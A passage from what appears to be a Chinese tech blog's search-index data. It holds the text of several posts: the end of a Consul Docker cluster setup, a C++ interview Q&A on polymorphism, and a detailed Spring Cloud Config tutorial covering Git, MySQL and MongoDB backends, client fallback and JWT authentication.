创建并启动第二个节点，172.17.0.3是第一个节点的IP# docker run -d --name=consul-node2 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3 agent -dev -join=172.17.0.3# 创建并启动第三个节点，172.17.0.3是第一个节点的IP# docker run -d --name=consul-node3 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3 agent -dev -join=172.17.0.3# 查看容器的运行状态# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1ac5832f79f4 consul:1.7.3 "docker-entrypoint.s…" 31 seconds ago Up 30 seconds 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node3533b0f12877a consul:1.7.3 "docker-entrypoint.s…" 56 seconds ago Up 55 seconds 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node2d25f90dffa94 consul:1.7.3 "docker-entrypoint.s…" 2 minutes ago Up 2 minutes 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node1# 在第一个容器中运行consul命令来查询集群中的所有成员# docker exec -t consul-node1 consul membersNode Address Status Type Build Protocol DC Segment1ac5832f79f4 172.17.0.5:8301 alive server 1.7.3 2 dc1 &lt;all&gt;533b0f12877a 172.17.0.4:8301 alive server 1.7.3 2 dc1 &lt;all&gt;d25f90dffa94 172.17.0.3:8301 alive server 1.7.3 2 dc1 &lt;all&gt;# 访问web管理界面# 浏览器访问：http://172.17.0.3:8500 Consul 容器的持久化 在开发模式下启动 Consul 容器，数据默认保存在内存中，容器重启后数据会丢失；若想使用 Docker 的数据卷持久化容器里的数据，可以挂载以下目录，如 docker -v /usr/share/consul/data:/consul/data。 /consul/data：Consul 存放数据的目录 /consul/config：Consul 存放配置文件的目录 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"C++ 基础面试题之一",url:"/posts/c62ca067.html",text:'多态请谈谈对多态的理解 多态的实现效果 多态是在运行期间根据具体对象的类型决定函数调用，同样的调用语句有多种不同的表现形态 多态实现的三个必要条件 有继承、有虚函数（virtual ）的重写、有父类的指针（引用）指向子类对象 多态的 C++ 实现 使用 virtual 关键字，告诉编译器这个函数要支持多态；不是根据指针类型判断如何调用，而是要根据指针所指向的实际对象类型来判断如何调用 多态的理论基础 动态联编 Vs 静态联编，根据实际的对象类型来判断重写函数的调用 多态的重要意义 多态是设计模式的基础，是框架的基石 实现多态的理论基础 函数指针做函数参数 函数指针一般有两种用法（正、反） 多态原理的探究 与面试官展开讨论 谈谈对重写与重载理解 函数重载 必须在同一个类中进行 子类无法重载父类的函数，父类同名函数将被子类的覆盖 重载是在编译期间根据参数类型、个数和顺序决定函数的调用 函数重写 必须发生于父类与子类之间 父类与子类中的函数必须有完全相同的原型 使用 virtual 关键字声明之后，能够产生多态（如果不使用 virtual 关键字声明，那叫重定义） 在父类的构造函数中调用虚函数，能实现多态吗子类的 VPTR 指针是分步完成初始化的，当执行父类的构造函数时，子类 的 VPTR 指针指向父类的虚函数表，当父类的构造函数执行完毕后，会把子类的 VPTR 指针指向子类的虚函数表。因此，在父类的构造函数中调用虚函数，不能实现多态。 分析图解 如图 所示 对象在创建的时，由编译器对 VPTR 指针进行初始化 只有当对象的构造全部完成后，VPTR 指针的指向才能最终确定 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Config 入门教程 - 中级篇",url:"/posts/f1872086.html",text:'上篇 - Config 入门教程（基础篇） Config 入门教程 - 基础篇 前言版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外。 Config 使用技巧本地参数覆盖远程参数在某些时候需要使用当前系统的环境变量或者是应用本身设置的参数而不是使用远程拉取的参数，此时 Config Client 可以使用如下配置： 官方 Bug 解决方案： https://github.com/spring-cloud/sprmg-cloud-config/issues/651 https://github.com/spring-cloud/spring-cloud-config/issues/359 123456spring: cloud: config: overrideNone: true allowOverride: true overrideSystemProperties: false overrideNone：当 allowOverride 为 true 时，overrideNone 设置为 true，代表外部配置的优先级更低，而且不能覆盖任何已存在的属性源，默认为 false allowOverride：标识 overrideSystemProperties 属性是否启用，默认为 true，设置为 false 表示禁止用户的个性化设置 overrideSystemProperties：用来标识外部配置是否能够覆盖系统属性，默认为 true 服务端 Git 配置详解Git 中 URI 占位符Spring Cloud Config Server 支持占位符的使用，支持 ｛application｝、{profile｝、{label｝，这样的话就可以在配置 uri 的时候，通过占位符使用应用名称来区分应用对应的仓库然后进行使用。下面举例说明 {application} 占位符的使用，点击下载完整的案例代码。 Config Server 的 application.yml 配置文件如下： 123456789101112131415server: port: 9090spring: application: name: config-server cloud: config: server: git: #根据不同的应用，使用不同的Git仓库，这里需要仓库名称和仓库下面的配置文件名称一致才可以 uri: https://gitee.com/peter/{application} username: admin password: admin search-paths: book-config Config Client 的 bootstrap.yml 配置文件如下： 1234567spring: cloud: config: label: master #Git分支的名称 profile: dev #本次访问的配置项 uri: http://localhost:9090 #Config Server的地址 name: spring-cloud-config #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀 使用上面的配置后，Config Client 请求 Config Server 仓库的连接地址的 uri 变成了 https://gitee.com/peter/spring-cloud-config，连接到了 spring-cloud-config 仓库；其中仓库的名称是由 Config Client 的 spring.cloud.config.name 属性指定，请求的配置文件的完整路径是 https://gitee.com/peter/spring-cloud-config/book-config/spring-cloud-config.yml；值得注意的是，这里需要仓库名称和仓库下面的配置文件名称一致才可以。 路径搜索占位符Spring Cloud Config Server 可以使用 searchPaths 参数进行路径的搜索，支持根据路径和路径前缀等方式进行配置文件的获取。 下述配置中的 book-config 表示匹配当前路径下面所有的配置文件信息，book-config* 表示在以 book-config 为前缀的文件夹内搜索所有配置文件。 1234567891011121314server: port: 9090spring: application: name: config-server cloud: config: server: git: uri: https://gitee.com/peter/spring-cloud-config username: admin password: admin search-paths: book-config, book-config* 下述配置中使用占位符的形式进行目录搜索，这样就可以根据不同的项目，对不同的配置文件进行路径搜索，从而很好地划分配置文件。值得注意的是，这里占位符的前后需要加上单引号，否则占位符无法生效。 123456789101112spring: application: name: config-server cloud: config: server: git: #根据不同的应用，搜索不同的目录路径，这里需要目录名称和目录里的配置文件名称一致才可以 uri: https://gitee.com/peter/spring-cloud-config username: admin password: admin search-paths: \'{application}\' 模式匹配和多个存储库在 application 和 profile 的使用上，Spring Cloud Config Server 还支持更复杂配置模式，可以使用通配符 {application}/{profile} 进行规则匹配，多个规则需要通过逗号分隔。以下配置中的 spring.cloud.config.server.uri 指明了默认的仓库地址，在使用 {application}/{profile} 匹配不上任何一个仓库时，会使用默认的仓库进行匹配来获取信息。对于 spring-cloud-config-simples 匹配的是 spring-cloud-config-simples/*，需要注意的是其仅能匹配应用名称为 spring-cloud-config-simples 的所有 profile 配置；对于 local 的仓库将会匹配所有的应用名以 local 开头的 Profiles。 123456789101112131415spring: cloud: config: server: git: uri: https://gitee.com/peter/spring-cloud-config search-paths: SC-BOOK-CONFIG repos: simple: https://gitee.com/peter/simple special: pattern: special*/dev*,*special*/dev* uri: https://gitee.com/peter/spring-cloud-config-special local: pattern: local* uri: /Users/peter/all_test/spring-cloud-config 关系型数据库的配置中心的实现1. 基于 MySQL 的配置概述Spring Cloud Config Server 默认提供了 JDBC 的方式连接 MySQL 数据库，整体的流程如下图，点击下载完整的案例代码。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件： 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt; 在 MySQL 中执行下述数据库脚本，创建对应的数据库和表，并插入对应的数据： 123456789101112131415161718192021-- 创建数据库create database `spring-cloud-config` default character set utf8;-- 当前数据库use `spring-cloud-config`;-- 创建类型表CREATE TABLE `PROPERTIES` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `KEY` TEXT DEFAULT NULL, `VALUE` TEXT DEFAULT NULL, `APPLICATION` TEXT DEFAULT NULL, `PROFILE` TEXT DEFAULT NULL, `LABLE` TEXT DEFAULT NULL, PRIMARY KEY (`ID`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;-- 插入数据INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'3\', \'cn.springcloud.config\', \'I am the mysql configuration file from dev environment.\', \'config-client\', \'dev\', \'master\');INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'4\', \'cn.springcloud.config\', \'I am the mysql configuration file from test environment.\', \'config-client\', \'test\', \'master\');INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'5\', \'cn.springcloud.config\', \'I am the mysql configuration file from prod environment.\', \'config-client\', \'prod\', \'master\'); 添加 Config Server 需要的 application.yml 配置文件到工程中，其中 spring.cloud.config.server.jdbc.sql 是在调用时使用的 SQL，spring.profiles.active=jdbc 表示使用的激活方式是 JDBC，spring.cloud.refresh.refreshable=none 是用来解决 DataSource 循环依赖问题。若项目中需要激活其他 profile，那么可以指定多个，例如 spring.profiles.active=jdbc,dev。 1234567891011121314151617181920212223242526server: port: 8001spring: application: name: config-server cloud: config: server: jdbc: sql: SELECT `KEY`, `VALUE` FROM PROPERTIES WHERE application =? AND profile =? AND lable =? label: master refresh: refreshable: none profiles: active: jdbc datasource: url: jdbc:mysql://127.0.0.1:3306/spring-cloud-config?useUnicode=true&amp;characterEncoding=UTF-8 username: root password: 123456 driver-class-name: com.mysql.jdbc.Driverlogging: level: org.springframework.jdbc.core: DEBUG org.springframework.jdbc.core.StatementCreatorUtils: Trace 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 启动 Config Server 应用后，浏览器输入 http://127.0.0.1:8001/config-client/dev/master 访问 Config Server，接口返回的结果如下： 4. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-client 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 MySQL 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123456server: port: 9090spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中： 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 5. 关于配置的刷新问题手动刷新和配置自动刷新对于 DB 环境下是否同时支持呢？对于 DB 操作来说，在自动刷新方面，一般是做了界面化的配置和管理，当成功提交配置到 DB 后，会调用 Config Server 的 Spring Cloud Bus 刷新接口，这样就可以实现和 Git 的 WebHook — 样的提交绑定执行功能。 6. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9090/getConfigInfo，接口会返回 I am the git configuration file from dev environment，说明一切运行正常 非关系型数据库的配置中心的实现基于 MongoDB 的配置概述Spring Cloud Config Server 并没有提供 MongoDB 的存储方式，但是目前 Spring Cloud 已经收录了一个相关的孵化器。整体的流程如下图，由于篇幅有限，下面只给出 Config Server 工程的核心配置和代码，而 Config Client 工程与上面 MySQL 的示例基本上一样，这里不再累述。 Config Server 工程的配置Config Server 工程的 pom.xml 文件，添加 MongoDB 的依赖支持： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server-mongodb&lt;/artifactId&gt; &lt;version&gt;0.0.2.BUILD-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Config Server 的主启动类，添加注解 @EnableMongoConfigServer： 12345678@SpringBootApplication@EnableMongoConfigServerpublic class MongoDbConfigServerApplication { public static void main(String[] args) { SpringApplication.run(MongoDbConfigServerApplication.class, args); }} Config Server 工程里的 application.yml 文件 123456789server: port: 8001spring: application: name: config-server data: mongodb: uri: mongodb://localhost/springcloud MongoDB 中的数据： 1234567891011{ "label" : "master", "profile" : "dev", "source" : { "cn" : { "springcloud" : { "config" : "I am the mongdb configuration file from dev environment. I will edit." } } }} Config 功能扩展客户端回退客户端的回退机制，可以处理网络中断的情况，或者配置服务因维护而关闭的场景。当启用回退时，客户端适配器将 “缓存” 本地文件系统中的配置属性。要启用回退功能，只需指定存储缓存的位置即可；这个功能也称之为客户端高可用的一部分，也就是在服务端无法连接的情况下，客户端依然是可以用的，点击下载完整的案例代码。 1. 准备工作由于下面的 Spring Cloud Config 使用 Git 作为存储方式，因此需要提前在 Git 远程仓库（Github、Gitlab）中创建对应的仓库，然后往仓库里 Push 三个配置文件，分别是 config-client-dev.yml、config-client-prod.yml、config-client-test.yml，配置文件的内容如下： 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 2. 创建 Config Client Fallback Autoconfig 工程创建 Config Client Fallback Autoconfig 工程，配置工程里的 pom.xml 文件，其中 spring-security-rsa 依赖主要是用于当配置信息中存在敏感信息（如用户名密码）时，对敏感信息加密后再缓存在本地： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.security&lt;/groupId&gt; &lt;artifactId&gt;spring-security-rsa&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client Fallback Autoconfig 工程里的 FallbackableConfigServicePropertySourceLocator 类，主要用来创建本地回退文件，也就是加载远程配置文件后在本地备份一份： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162@Order(0)public class FallbackableConfigServicePropertySourceLocator extends ConfigServicePropertySourceLocator { private boolean fallbackEnabled; private String fallbackLocation; @Autowired(required = false) TextEncryptor textEncryptor; public FallbackableConfigServicePropertySourceLocator(ConfigClientProperties defaultProperties, String fallbackLocation) { super(defaultProperties); this.fallbackLocation = fallbackLocation; this.fallbackEnabled = !StringUtils.isEmpty(fallbackLocation); } @Override public PropertySource&lt;?&gt; locate(Environment environment) { PropertySource&lt;?&gt; propertySource = super.locate(environment); if (fallbackEnabled) { if (propertySource != null) { storeLocally(propertySource); } } return propertySource; } private void storeLocally(PropertySource propertySource) { StringBuilder sb = new StringBuilder(); CompositePropertySource source = (CompositePropertySource) propertySource; for (String propertyName : source.getPropertyNames()) { Object value = source.getProperty(propertyName); if (textEncryptor != null) value = "{cipher}" + textEncryptor.encrypt(String.valueOf(value)); sb.append(propertyName).append("=").append(value).append("\\n"); } System.out.println("file contents : " + sb.toString()); saveFile(sb.toString()); } private void saveFile(String contents) { BufferedWriter output = null; File file = new File(fallbackLocation + File.separator + ConfigServerBootstrap.FALLBACK_FILE_NAME); try { if (!file.exists()) { file.createNewFile(); } output = new BufferedWriter(new FileWriter(file)); output.write(contents); } catch (IOException e) { e.printStackTrace(); } finally { if (output != null) { try { output.close(); } catch (IOException e) { System.out.print("Error" + e.getMessage()); } } } }} 创建 Config Client Fallback Autoconfig 工程的自动配置类，添加相关注解，使其在 Spring Boot 启动的时候进行加载。其中 spring.cloud.config.fallbackLocation 是指回退配置文件所在的目录路径，file:${spring. cloud.config.fallbackLocation:}/fallback.properties 是指回退配置文件的完整路径： 12345678910111213141516171819202122232425262728293031/** * 客户端自动配置依赖启动 */@Configuration@EnableConfigurationProperties@PropertySource(value = {"config-client.properties", "file:${spring.cloud.config.fallbackLocation:}/fallback.properties"}, ignoreResourceNotFound = true)public class ConfigServerBootstrap { public static final String FALLBACK_FILE_NAME = "fallback.properties"; @Autowired private ConfigurableEnvironment environment; @Value("${spring.cloud.config.fallbackLocation:}") private String fallbackLocation; @Bean public ConfigClientProperties configClientProperties() { ConfigClientProperties clientProperties = new ConfigClientProperties(this.environment); clientProperties.setEnabled(false); return clientProperties; } @Bean public FallbackableConfigServicePropertySourceLocator fallbackableConfigServicePropertySourceLocator() { ConfigClientProperties client = configClientProperties(); FallbackableConfigServicePropertySourceLocator fallbackableConfigServicePropertySourceLocator = new FallbackableConfigServicePropertySourceLocator(client, fallbackLocation); return fallbackableConfigServicePropertySourceLocator; }} 创建 Config Client Fallback Autoconfig 工程里的 /src/main/resources/config-client.properties 配置文件： 1spring.cloud.config.enabled=false 创建 Config Refresh Fallback Autoconfig 工程里 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.fallback.config.ConfigServerBootstrap 3. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入上面的 config-client-fallback-autoconfig： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-fallback-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，fallbackLocation 指定了回退文件的路径： 12345678spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 fallbackLocation: /tmp/config/config-client-dev/ #回退文件的路径 4. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中： 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 5. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo 后观察返回的配置信息，与此同时查看是否在目录 /tmp/config/config-client-dev/ 下成功创建了回退文件 fallback.properties 关闭 config-server、config-client 应用，然后单独启动 config-client 应用；观察在不启动 config-server 的情况下，config-client 应用是否能正常启动 若 config-client 应用单独启动成功，config-client 应用会先尝试去连接 config-server，当连接失败后，会加载本地的回退配置文件，此时控制台输出的日志信息如下： 1234c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://127.0.0.1:8001c.c.c.ConfigServicePropertySourceLocator : Connect Timeout Exception on Url - http://127.0.0.1:8001. Will be trying the next url if availablec.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: I/O error on GET request for "http://127.0.0.1:8001/config-client/dev/master": 拒绝连接; nested exception is java.net.ConnectException: 拒绝连接c.s.study.ConfigClientApplication : No active profile set, falling back to default profiles: default 客户端的安全认证机制 JWTSpring Cloud Config 客户端支持使用 JWT 身份验证方法代替标准的基本身份验证，这种方式需要对服务端和客户端都要改造，点击下载完整的案例代码，具体的验证步骤如下： 客户端向服务端负载授权的 RestController 发送请求，并且带上用户名和密码 服务端成功验证用户名和密码后，返回 Jwt Token 客户端加载服务端的配置信息，需要在 Header 中带上 Token 令牌进行认证 i. 准备工作本示例用到上面的 “客户端回退” 示例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 ii. 创建 Config Client Jwt 工程创建 Config Client Jwt 工程，配置工程里的 pom.xml 文件： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client Jwt 工程的自动配置类，@PostConstruct 注解是执行是在 Servlet 构造函数和 init() 方法执行之间，也就是说在容器启动过程中会创建一个 RestTemplate 对象，将用户名和密码发送到 Config Server 端进行认证；认证成功会返回 Token，如果认证过程中用户名或者是密码错误，则将返回一个 401 认证失败的错误码。其中 ${spring.cloud.config.usemame}、 ${spring.cloud.config.password} 等参数是配置在客户端的，这里需要创建 ConfigServicePropertySourceLocator 这个 Bean 并且自定义一个 RestTemplate 对象需要带上 Token 信息，这就是代码中的 customRestTemplate 方法。还需要定义一个 ClientHttpRequestlnterceptor 接口的实现类，也就是代码中的 GenericRequestHeaderInterceptor 类，主要用于拦截发送到 Config Server 获取配置信息的请求，将 Token 信息添加到 HttpServletRequest 的 Headers 中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112@Configuration@Order(Ordered.LOWEST_PRECEDENCE)public class ConfigClientBootstrapConfiguration { private static Log logger = LogFactory.getLog(ConfigClientBootstrapConfiguration.class); @Value("${spring.cloud.config.username}") private String jwtUserName; @Value("${spring.cloud.config.password}") private String jwtPassword; @Value("${spring.cloud.config.endpoint}") private String jwtEndpoint; private String jwtToken; @Autowired private ConfigurableEnvironment environment; @PostConstruct public void init() { RestTemplate restTemplate = new RestTemplate(); LoginRequest loginBackend = new LoginRequest(); loginBackend.setUsername(jwtUserName); loginBackend.setPassword(jwtPassword); String serviceUrl = jwtEndpoint; Token token; try { token = restTemplate.postForObject(serviceUrl, loginBackend, Token.class); if (token.getToken() == null) { throw new Exception(); } // 设置token setJwtToken(token.getToken()); } catch (Exception e) { e.printStackTrace(); } } public String getJwtToken() { return jwtToken; } public void setJwtToken(String jwtToken) { this.jwtToken = jwtToken; } @Bean public ConfigServicePropertySourceLocator configServicePropertySourceLocator(ConfigClientProperties configClientProperties) { ConfigServicePropertySourceLocator configServicePropertySourceLocator = new ConfigServicePropertySourceLocator(configClientProperties); configServicePropertySourceLocator.setRestTemplate(customRestTemplate()); return configServicePropertySourceLocator; } @Bean public ConfigClientProperties configClientProperties() { ConfigClientProperties clientProperties = new ConfigClientProperties(this.environment); clientProperties.setEnabled(false); return clientProperties; } /** * 自定义restTemplate ，在发送的时候带上token * * @return */ private RestTemplate customRestTemplate() { Map&lt;String, String&gt; headers = new HashMap&lt;&gt;(); headers.put("token", "Bearer:" + jwtToken); SimpleClientHttpRequestFactory requestFactory = new SimpleClientHttpRequestFactory(); requestFactory.setReadTimeout((60 * 1000 * 3) + 5000); RestTemplate template = new RestTemplate(requestFactory); if (!headers.isEmpty()) { template.setInterceptors( Arrays.&lt;ClientHttpRequestInterceptor&gt;asList(new GenericRequestHeaderInterceptor(headers))); } return template; } /** * 客户端请求过滤器 */ public static class GenericRequestHeaderInterceptor implements ClientHttpRequestInterceptor { private final Map&lt;String, String&gt; headers; public GenericRequestHeaderInterceptor(Map&lt;String, String&gt; headers) { this.headers = headers; } /** * 请求之前操作的方法 * * @param httpRequest * @param bytes * @param clientHttpRequestExecution * @return * @throws IOException */ @Override public ClientHttpResponse intercept(HttpRequest httpRequest, byte[] bytes, ClientHttpRequestExecution clientHttpRequestExecution) throws IOException { headers.entrySet().stream().forEach(header -&gt; { httpRequest.getHeaders().add(header.getKey(), header.getValue()); }); return clientHttpRequestExecution.execute(httpRequest, bytes); } }} 创建 Config Client Jwt 工程里的实体类，用于传递用户信息： 123456789101112@JsonIgnoreProperties(ignoreUnknown = true)@JsonInclude(JsonInclude.Include.NON_NULL)public class LoginRequest implements Serializable { @JsonProperty private String username; @JsonProperty private String password; //省略getter、setter方法} 123456789@JsonIgnoreProperties(ignoreUnknown = true)@JsonInclude(JsonInclude.Include.NON_NULL)public class Token implements Serializable { @JsonProperty private String token; //省略getter、setter方法} 在 Config Client Jwt 工程里创建 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 